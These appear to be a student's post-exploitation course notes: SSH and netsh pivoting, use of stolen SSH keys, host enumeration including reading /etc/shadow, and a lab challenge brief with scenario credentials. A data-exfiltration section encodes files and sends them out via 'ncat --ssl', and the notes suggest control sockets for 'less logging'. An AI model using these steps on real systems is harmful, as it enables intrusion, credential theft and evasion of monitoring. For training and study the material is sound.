

------------------------------------------------------------------------------------------[Post Exploitation]------------------------------------------------------------------------------------------


[SSH Overview]
Basic Characteristics:

* Access remote systems using an SSH server as a proxy

* Securely transfer files

* Execute commands on a remote system

* VPN using the SSH protocol as a transport

* Forwarding the X Window System display to the client system


[Linux Targets]
Local Port Forward
-L <USER PORT ON LOCAL>:TARGETHOST:TARGETPORT
Remote Port Forward
ssh USER@<PIVOT IP> -R <REMOTE PORT ON PIVOT>:TARGETHOST:TARGETPORT


[Windows Targets]
Port Proxying
netsh interface portproxy add v4tov4 listenport=<LocalPort> listenaddress=<LocalIP> connectport=<TargetPort> connectaddress=<TargetIP> protocol=tcp
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=<LocalPort>
netsh interface portproxy reset


[SSH Keys]
SSH keys are asymetric(public/private) key pairs that can be used to authenticate a user to a system in combination with or to replace the use of a password

If you are able to find a users private ssh key it can potentially be used to gain access to other systems



Using Stolen SSH Keys
Bring private key to your own box

On your box:

chmod 600 /home/student/stolenkey
ssh -i /home/student/stolenkey jane@1.2.3.4
ssh as the user who is the original key owner


[Windows Commands]
net user <optional username>
net localgroup <optional group>
tasklist /b or use gui (task manager)
tasklist /svc or use gui (task manager --> service tab)
netstat /ano
netstat /anop (only as administrator)
net use
net view
arp -a
route print


powershell:
get-service | where {$_.Status -eq "running"}


[Linux Comands]
cat /etc/passwd
cat /etc/shadow
who
last
whoami
groups
ps -elf
pstree
lsof
systemctl
systemctl list-units --type service
systemctl list-units --type service | grep running
ifconfig -a
netstat -anob
netstat-nltp


[Control Sockets]
Benefits Provided Include:

* Multiplexing

* Data exfiltration

* Less logging


[Control Sockets (config)]
Two main ways to configure:

Command Line Method
ssh -M -S /tmp/s root@<IP ADDRESS> <TUNNEL COMMANDS -R or -L>

ssh -S /tmp/s x@x
scp -o 'ControlPath=/tmp/s' x@x:<Path>


Configuration File Method (~/.ssh/ssh_config)
HostName *
ControlPath ~/.ssh/controlmasters/%r@%h:%p
ControlMaster auto
ControlPersist 10m


[Data Exfiltration]

Session Transcript
 ssh <user>@<host> | tee
 
Obfuscation (Windows)
type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
certutil -encode <file> encoded.b64

Obfuscation (Linux)
cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
cat <file>> | base64

Encrypted Transport
scp <source> <destination>
ncat --ssl <ip> <port> < <file>



-----[Golden Nuggets]-----
/etc/crontab
crontab within linux machine are gonna be scheduled task
/var/www/html
linux /etc/hosts - deals with host name resolutions
find -iname *password*.txt
sudo -l
as an attacker, you dont want to see rsyslogd


ls -latr












----------------------------------------------------------------------------------------------[Challenges]---------------------------------------------------------------------------------------------

Donovian Post Exploitation (DPE)
XX Mar 2024
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)

Objective: Maneuver through Donovian-Extranet, identify and gain access futher into Donovian internal Cyberspace, it is believed that there is an network that acts as an internal DMZ between these to locations. Intelligence was able to identify the last octet of a system that resides in the Donovian internal Cyberspace.

Tools/Techniques: All connections will be established through SSH masquerades or web browser. Ports in use will be dependent on target location and are subject to change. Network scanning tools/technique usage is at the discretion of student. Credential reuse is authorized

Scenario Credentials: FLAG = P05T3xpl01t5t@rtoF@ct1v1ty

Prior Approvals: Sudo usage and remote port forward is authorized. System dir walks from system roots, altering accounts/routing or tool uploads are authorized. Survey and access to newly discovered systems during C-ISR.

Scheme of Maneuver:
>Jump Box
->T1: 192.168.28.100
-->T3:x.x.x.9

Target Section:

T1
Hostname: Donovian_Extranet
IP: 192.168.28.100
OS: CentOS
Creds:Unknown
Last Known SSH Port: 2222
PSP: none
Malware: none
Action: Perform SSH masquerade and survey system. Identify redirection to the next target.


192.168.150.253 Donovian-Intranet


T3
Hostname: unknown
IP: x.x.x.9
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Gain access; survey host and map Donovian internal Cyberspace






12301 12356














































































































































